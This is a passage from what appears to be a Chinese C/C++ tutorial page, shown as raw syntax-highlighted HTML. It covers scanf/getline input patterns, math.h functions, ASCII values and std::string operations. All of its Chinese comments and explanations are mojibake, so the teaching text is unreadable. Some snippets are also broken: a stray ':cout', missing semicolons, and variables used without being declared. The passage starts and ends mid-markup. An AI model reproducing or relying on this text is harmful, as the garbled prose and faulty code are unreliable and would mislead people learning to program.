class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%[^\n]&quot;</span>, str);  <span class="hljs-comment">// è¯»å–ä¸€æ•´è¡Œï¼Œç›´åˆ°æ¢è¡Œç¬¦,åŒ…å«ç©ºæ ¼çš„å­—ç¬¦ä¸²</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);  <span class="hljs-comment">// è¯»å–æ•´æ•°</span><br>    getchar();         <span class="hljs-comment">// æ¸…é™¤è¾“å…¥ç¼“å†²åŒºä¸­çš„æ¢è¡Œç¬¦,æ¯è¯»å–ä¸€è¡Œå°±getchar()</span><br>    <span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%[^\n]&quot;</span>, str);  <span class="hljs-comment">// è¯»å–ä¸€è¡Œå­—ç¬¦ä¸²</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä½ è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯: %s\n&quot;</span>, str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¾“å…¥çš„æ•´æ•°æ˜¯: %d\n&quot;</span>, a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¾“å…¥çš„æµ®ç‚¹æ•°æ˜¯: %.2f\n&quot;</span>, b);  <span class="hljs-comment">// æ§åˆ¶æµ®ç‚¹æ•°è¾“å‡ºä¿ç•™ä¸¤ä½å°æ•°</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¾“å…¥çš„åŒç²¾åº¦æµ®ç‚¹æ•°æ˜¯: %.3lf\n&quot;</span>, c);  <span class="hljs-comment">// æ§åˆ¶åŒç²¾åº¦æµ®ç‚¹æ•°è¾“å‡ºä¿ç•™ä¸‰ä½å°æ•°</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯: %s\n&quot;</span>, str);<span class="hljs-comment">//ç›´åˆ°&#x27;\0&#x27;æ‰ç»“æŸä¹Ÿå°±æ˜¯å¯ä»¥å¸¦ç©ºæ ¼</span><br><br><span class="hljs-type">int</span> arr[] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(arr) / <span class="hljs-keyword">sizeof</span>(arr[<span class="hljs-number">0</span>]); ++i) &#123;   <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, arr[i]);<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ scanf è¾“å…¥ vector ä¸­çš„æ¯ä¸ªå…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;vec[i]);  <span class="hljs-comment">// é€ä¸ªè¯»å–å…ƒç´ </span><br>&#125;<br><span class="hljs-comment">// è¾“å‡ºè¯»å–åˆ°çš„å…ƒç´ </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Vector elements: &quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; vec.size(); ++i) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, vec[i]);  <span class="hljs-comment">// è¾“å‡ºæ¯ä¸ªå…ƒç´ </span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœå¸¦ç©ºæ ¼,ç”¨cin&#x2F;scanfä¹‹åä¸èƒ½<strong>ç›²ç›®ç”¨</strong>getchar&#x2F;getline&#x2F;getï¼Œå¦‚æœè¦ç”¨ï¼Œ<strong>å°±è¦åœ¨cinååƒå­—ç¬¦</strong></p><p>ç”¨getchar&#x2F;getline&#x2F;getä¹‹åå¯ä»¥ç”¨cin&#x2F;scanf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//getline/getchar/getå¯ä»¥æ¥å—ç©ºæ ¼ï¼Œè¯»å–æ—¶é‡åˆ°æ¢è¡Œç¬¦ç»“æŸ</span><br><span class="hljs-built_in">string</span> str;<br>getline(<span class="hljs-built_in">cin</span>, str);<br><span class="hljs-built_in">cout</span>&lt;&lt;str&lt;&lt;<span class="hljs-built_in">endl</span>;    <br></code></pre></td></tr></table></figure><p>å¯èƒ½è¾“å…¥çš„åœºæ™¯æ€»ç»“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*è¾“å…¥å¤šä¸ªæ•´æ•° </span><br><span class="hljs-comment">4</span><br><span class="hljs-comment">5 3 8 1</span><br><span class="hljs-comment">*/</span>      <br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);  <span class="hljs-comment">// è¾“å…¥æ•´æ•°çš„ä¸ªæ•°</span><br><span class="hljs-type">int</span> arr[n];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;arr[i]);  <span class="hljs-comment">// è¾“å…¥æ¯ä¸ªæ•´æ•°</span><br>&#125;<br><br><br><br><span class="hljs-comment">/*è¾“å…¥ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼ˆçŸ©é˜µï¼‰</span><br><span class="hljs-comment">1 2 3</span><br><span class="hljs-comment">4 5 6</span><br><span class="hljs-comment">7 8 9</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n, m;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);  <span class="hljs-comment">// è¾“å…¥è¡Œæ•°å’Œåˆ—æ•°</span><br><span class="hljs-type">int</span> mat[n][m];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;mat[i][j]);  <span class="hljs-comment">// è¾“å…¥çŸ©é˜µçš„æ¯ä¸ªå…ƒç´ </span><br>    &#125;<br>&#125;<br><span class="hljs-comment">// è¾“å…¥çŸ©é˜µå…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; matrix[i][j];  <span class="hljs-comment">// ä½¿ç”¨ cin è¯»å–æ¯ä¸ªå…ƒç´ </span><br>    &#125;<br>&#125;<br><span class="hljs-comment">// è¾“å‡ºçŸ©é˜µå…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; matrix[i][j] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºçŸ©é˜µçš„å…ƒç´ </span><br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡ºå®Œä¸€è¡Œåæ¢è¡Œ</span><br>&#125;<br><br><br><br><span class="hljs-comment">/*è¾“å…¥å•è¡Œå­—ç¬¦ä¸²ï¼ˆæ²¡æœ‰ç©ºæ ¼ï¼‰</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);  <span class="hljs-comment">// è¾“å…¥ä¸åŒ…å«ç©ºæ ¼çš„å•è¡Œå­—ç¬¦ä¸²</span><br><br><br><span class="hljs-comment">/*å…¥æ•´è¡Œå­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</span><br><span class="hljs-comment">Hello world! Welcome to BlueBridge.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">string</span> line;<br><span class="hljs-comment">// ä½¿ç”¨ getline è¯»å–ä¸€æ•´è¡Œè¾“å…¥ï¼ŒåŒ…æ‹¬ç©ºæ ¼</span><br>getline(<span class="hljs-built_in">cin</span>, line);<br><span class="hljs-comment">// è¾“å‡ºè¾“å…¥çš„å­—ç¬¦ä¸²</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; line &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br><br><br><span class="hljs-comment">/* è¾“å…¥å¤šè¡Œå­—ç¬¦ä¸²</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">Hello</span><br><span class="hljs-comment">world</span><br><span class="hljs-comment">BlueBridge</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*è¾“å…¥å¤šä¸ªç©ºæ ¼åˆ†éš”çš„å­—ç¬¦ä¸²ï¼Œé€ä¸ªå¤„ç†</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">apple banana cherry</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">cin</span> &gt;&gt; n;  <span class="hljs-comment">// è¯»å–è¾“å…¥çš„è¡Œæ•°</span><br><span class="hljs-built_in">cin</span>.ignore();  <span class="hljs-comment">// å¿½ç•¥æ‰è¾“å…¥è¡Œæ•°åçš„æ¢è¡Œç¬¦</span><br><span class="hljs-built_in">string</span> line;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    getline(<span class="hljs-built_in">cin</span>, line);  <span class="hljs-comment">// é€è¡Œè¯»å–å­—ç¬¦ä¸²</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; line &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡ºæ¯è¡Œ</span><br>&#125;<br><br><br><br><span class="hljs-comment">/*è¾“å…¥ä¸€ä¸ªäºŒç»´å­—ç¬¦æ•°ç»„</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">char</span> mat[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<br><span class="hljs-type">int</span> n, m;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);  <span class="hljs-comment">// è¾“å…¥è¡Œæ•°å’Œåˆ—æ•°</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot; %c&quot;</span>, &amp;mat[i][j]);  <span class="hljs-comment">// è¾“å…¥å­—ç¬¦çŸ©é˜µçš„æ¯ä¸ªå­—ç¬¦</span><br>    &#125;<br>&#125;<br><br><br><br><br><br> <span class="hljs-comment">/*è¾“å…¥å¸¦æœ‰ç‰¹æ®Šç¬¦å·çš„å­—ç¬¦ä¸²*/</span><br><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br>getchar();  <span class="hljs-comment">// æ¸…é™¤æ¢è¡Œç¬¦</span><br>fgets(str, <span class="hljs-keyword">sizeof</span>(str), <span class="hljs-built_in">stdin</span>);  <span class="hljs-comment">// è¾“å…¥å¸¦ç‰¹æ®Šç¬¦å·çš„å­—ç¬¦ä¸²</span><br><br><br><span class="hljs-comment">/*è¾“å…¥å¤šä¸ªæœ‰ç‰¹å®šå…³ç³»çš„æ•°æ®ï¼ˆå¦‚è¾¹å’ŒèŠ‚ç‚¹ï¼‰</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">1 2</span><br><span class="hljs-comment">2 3</span><br><span class="hljs-comment">3 4</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n, m;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);  <span class="hljs-comment">// è¾“å…¥èŠ‚ç‚¹æ•°å’Œè¾¹æ•°</span><br><span class="hljs-type">int</span> edges[m][<span class="hljs-number">2</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;edges[i][<span class="hljs-number">0</span>], &amp;edges[i][<span class="hljs-number">1</span>]);  <span class="hljs-comment">// è¾“å…¥æ¯æ¡è¾¹çš„ä¸¤ä¸ªç«¯ç‚¹</span><br>&#125;<br><br><br><span class="hljs-comment">/*è¾“å…¥å¤šä¸ªæ—¥æœŸå’Œæ—¶é—´æ ¼å¼çš„æ•°æ®</span><br><span class="hljs-comment">2022-02-18 12:30:00</span><br><span class="hljs-comment">2023-03-19 14:45:00</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> <span class="hljs-title">t</span>;</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d-%d-%d %d:%d:%d&quot;</span>, &amp;t.tm_year, &amp;t.tm_mon, &amp;t.tm_mday, &amp;t.tm_hour, &amp;t.tm_min, &amp;t.tm_sec) != EOF) &#123;<br>    t.tm_year -= <span class="hljs-number">1900</span>;  <span class="hljs-comment">// æ—¥æœŸæ ¼å¼è°ƒæ•´</span><br>    t.tm_mon -= <span class="hljs-number">1</span>;  <span class="hljs-comment">// æœˆä»½ä»0å¼€å§‹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d-%02d-%02d %02d:%02d:%02d\n&quot;</span>, t.tm_year + <span class="hljs-number">1900</span>, t.tm_mon + <span class="hljs-number">1</span>, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec);<br>&#125;<br><br><br><br><br><br></code></pre></td></tr></table></figure><h4 id="2-åŸºæœ¬æ•°å­¦å‡½æ•°"><a href="#2-åŸºæœ¬æ•°å­¦å‡½æ•°" class="headerlink" title="2.åŸºæœ¬æ•°å­¦å‡½æ•°"></a>2.<strong>åŸºæœ¬æ•°å­¦å‡½æ•°</strong></h4><ul><li><strong><code>abs(int x)</code></strong>: è¿”å›æ•´æ•° <code>x</code> çš„ç»å¯¹å€¼ã€‚</li><li><strong><code>fabs(double x)</code></strong>: è¿”å›æµ®ç‚¹æ•° <code>x</code> çš„ç»å¯¹å€¼ã€‚</li><li><strong><code>sqrt(double x)</code></strong>: è¿”å› <code>x</code> çš„å¹³æ–¹æ ¹ã€‚</li><li><strong><code>pow(double base, double exp)</code></strong>: è¿”å› <code>base</code> çš„ <code>exp</code> æ¬¡æ–¹ã€‚</li><li><strong><code>exp(double x)</code></strong>: è¿”å› <code>e</code> çš„ <code>x</code> æ¬¡æ–¹ã€‚</li><li><strong><code>log(double x)</code></strong>: è¿”å› <code>x</code> çš„è‡ªç„¶å¯¹æ•°ã€‚</li><li><strong><code>log10(double x)</code></strong>: è¿”å› <code>x</code> çš„ä»¥ 10 ä¸ºåº•çš„å¯¹æ•°ã€‚</li><li><strong><code>ceil(double x)</code></strong>: è¿”å›å¤§äºæˆ–ç­‰äº <code>x</code> çš„æœ€å°æ•´æ•°ã€‚</li><li><strong><code>floor(double x)</code></strong>: è¿”å›å°äºæˆ–ç­‰äº <code>x</code> çš„æœ€å¤§æ•´æ•°ã€‚</li><li><strong><code>round(double x)</code></strong>: è¿”å›æœ€æ¥è¿‘ <code>x</code> çš„æ•´æ•°ã€‚</li></ul><p><strong>ä¸‰è§’å‡½æ•°</strong></p><ul><li><strong><code>sin(double x)</code></strong>: è¿”å› <code>x</code> çš„æ­£å¼¦å€¼ã€‚</li><li><strong><code>cos(double x)</code></strong>: è¿”å› <code>x</code> çš„ä½™å¼¦å€¼ã€‚</li><li><strong><code>tan(double x)</code></strong>: è¿”å› <code>x</code> çš„æ­£åˆ‡å€¼ã€‚</li><li><strong><code>asin(double x)</code></strong>: è¿”å› <code>x</code> çš„åæ­£å¼¦å€¼ã€‚</li><li><strong><code>acos(double x)</code></strong>: è¿”å› <code>x</code> çš„åä½™å¼¦å€¼ã€‚</li><li><strong><code>atan(double x)</code></strong>: è¿”å› <code>x</code> çš„åæ­£åˆ‡å€¼ã€‚</li><li><strong><code>atan2(double y, double x)</code></strong>: è®¡ç®— <code>y/x</code> çš„åæ­£åˆ‡å€¼ï¼Œè€ƒè™‘è±¡é™ã€‚</li></ul><p><strong>å¸¸æ•°</strong></p><ul><li><strong><code>M_PI</code></strong>: <code>Ï€</code> çš„å€¼ã€‚</li><li><strong><code>M_E</code></strong>: <code>e</code> çš„å€¼ã€‚</li></ul><p><strong>å…¶ä»–å‡½æ•°</strong></p><ul><li><strong><code>modf(double x, double\* intpart)</code></strong>: æ‹†åˆ† <code>x</code> ä¸ºæ•´æ•°éƒ¨åˆ†å’Œå°æ•°éƒ¨åˆ†ã€‚</li><li><strong><code>fmod(double x, double y)</code></strong>: è¿”å› <code>x</code> é™¤ <code>y</code> çš„ä½™æ•°ã€‚</li><li><strong><code>hypot(double x, double y)</code></strong>: è¿”å› <code>sqrt(x^2 + y^2)</code>ã€‚</li></ul><p><strong>éšæœºæ•°</strong></p><ul><li><strong><code>rand()</code></strong>: è¿”å›ä¸€ä¸ªéšæœºæ•´æ•°ã€‚</li><li><strong><code>srand(unsigned int seed)</code></strong>: è®¾ç½®éšæœºæ•°ç§å­ã€‚</li></ul><p><strong>ç‰¹æ®Šå€¼åˆ¤æ–­</strong></p><ul><li><code>isnan(double x)</code>: åˆ¤æ–­ <code>x</code> æ˜¯å¦ä¸º NaNã€‚</li><li><strong><code>isfinite(double x)</code></strong>: åˆ¤æ–­ <code>x</code> æ˜¯å¦ä¸ºæœ‰é™å€¼ã€‚</li><li><strong><code>isinf(double x)</code></strong>: åˆ¤æ–­ <code>x</code> æ˜¯å¦ä¸ºæ— ç©·å¤§ã€‚</li></ul><hr><h3 id="2-å­—ç¬¦"><a href="#2-å­—ç¬¦" class="headerlink" title="2.å­—ç¬¦"></a>2.å­—ç¬¦</h3><p>C++ ä¸­ï¼Œæ¯ä¸ªå¸¸ç”¨å­—ç¬¦å¯¹åº”ä¸€ä¸ªæ•´æ•°å€¼ï¼Œé€šå¸¸ç§°ä¸º ASCII å€¼ã€‚å¯ä»¥é€šè¿‡å­—ç¬¦ä¸å¯¹åº”çš„æ•´æ•°å€¼ç›¸äº’è½¬åŒ–ã€‚</p><ul><li><h4 id="å­—ç¬¦ä¸-ASCII-ç ï¼š"><a href="#å­—ç¬¦ä¸-ASCII-ç ï¼š" class="headerlink" title="å­—ç¬¦ä¸ ASCII ç ï¼š"></a><strong>å­—ç¬¦ä¸ ASCII ç ï¼š</strong></h4><ul><li>â€˜Aâ€™ - â€˜Zâ€™ å¯¹åº”çš„ ASCII å€¼æ˜¯ 65 ~ 90</li><li>â€˜aâ€™ - â€˜zâ€™ å¯¹åº”çš„ ASCII å€¼æ˜¯ 97 ~ 122</li><li>â€˜0â€™ - â€˜9â€™ å¯¹åº”çš„ ASCII å€¼æ˜¯ 48 ~ 57</li></ul></li><li><p><strong>å­—ç¬¦å¯ä»¥å‚ä¸è¿ç®—ï¼š</strong></p><ul><li>è¿ç®—æ—¶ï¼Œå­—ç¬¦ä¼šè¢«å½“åšæ•´æ•°å¤„ç†ï¼Œä½¿ç”¨å…¶å¯¹åº”çš„ ASCII å€¼ã€‚</li></ul></li></ul><p>å­—ç¬¦ä¸²åœ¨ C++ ä¸­æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œæ•°ç»„çš„æœ«å°¾æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç»“æŸç¬¦ <code>&#39;\0&#39;</code>ã€‚æ‰€ä»¥è¾“å‡ºå­—ç¬¦ä¸²å°±ç›´æ¥è¾“å‡ºarrè¿™ä¸ªå°±è¡Œ char arr[]&#x3D;â€hello worldâ€;</p><h4 id="å­—ç¬¦æ•°ç»„çš„å¸¸ç”¨æ“ä½œ"><a href="#å­—ç¬¦æ•°ç»„çš„å¸¸ç”¨æ“ä½œ" class="headerlink" title="å­—ç¬¦æ•°ç»„çš„å¸¸ç”¨æ“ä½œ"></a><strong>å­—ç¬¦æ•°ç»„çš„å¸¸ç”¨æ“ä½œ</strong></h4><ol><li><code>strlen(str)</code>ï¼šè®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ã€‚</li><li><code>strcmp(a, b)</code>ï¼šæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ŒæŒ‰å­—å…¸åºæ¯”è¾ƒã€‚</li><li><code>strcpy(a, b)</code>ï¼šå°†å­—ç¬¦ä¸² <code>b</code> å¤åˆ¶åˆ° <code>a</code>ã€‚</li></ol><hr><h4 id="æ ‡å‡†åº“ç±»å‹-string"><a href="#æ ‡å‡†åº“ç±»å‹-string" class="headerlink" title="æ ‡å‡†åº“ç±»å‹ string"></a>æ ‡å‡†åº“ç±»å‹ <code>string</code></h4><p><code>string</code> æ˜¯ä¸€ä¸ªåŠ¨æ€çš„å­—ç¬¦åºåˆ— ç­‰åŒäºchar arr[]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> s1 = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-built_in">string</span> <span class="hljs-title function_">s2</span><span class="hljs-params">(<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;c&#x27;</span>)</span>;  <span class="hljs-comment">// åˆå§‹åŒ–ä¸º &quot;ccccc&quot;</span><br></code></pre></td></tr></table></figure><p><strong><code>string</code> ä¸Šçš„å¸¸è§æ“ä½œ</strong></p><p>è¯»å–å•ä¸ªå•è¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str;<br><span class="hljs-built_in">cin</span> &gt;&gt; str;<br></code></pre></td></tr></table></figure><p><strong><code>getline</code> è¯»å–ä¸€æ•´è¡Œ</strong>:ä½¿ç”¨æ—¶è®°å¾—æ£€æŸ¥ä¹‹å‰çš„scanfå¦‚æœæœ‰å°±getchar();æ¸…é™¤ä¸€ä¸‹ç¼“å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">getline(<span class="hljs-built_in">cin</span>, str);  <span class="hljs-comment">// è¯»å–ä¸€æ•´è¡Œè¾“å…¥</span><br></code></pre></td></tr></table></figure><p><strong><code>empty</code> å’Œ <code>size</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©º: &quot;</span> &lt;&lt; str.empty() <br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;å­—ç¬¦ä¸²çš„é•¿åº¦: &quot;</span> &lt;&lt; str.size() <br></code></pre></td></tr></table></figure><p><strong><code>string</code> çš„æ¯”è¾ƒï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (s1 &lt; s2) &#123;<br>     <span class="hljs-built_in">cout</span> &lt;&lt; s1 &lt;&lt; <span class="hljs-string">&quot; å°äº &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong><code>string</code> èµ‹å€¼ä¸æ‹¼æ¥</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> s3 = s1 + <span class="hljs-string">&quot;, &quot;</span> + s2;<br></code></pre></td></tr></table></figure><p><strong>findæŸ¥è¯¢å­ä¸²</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (pos != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;       <span class="hljs-comment">//å¦‚æœæ²¡æ‰¾åˆ°ï¼Œè¿”å›std::string::npos</span><br>    :<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Found at position &quot;</span> &lt;&lt; pos &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Not found&quot;</span> &lt;&lt; <span 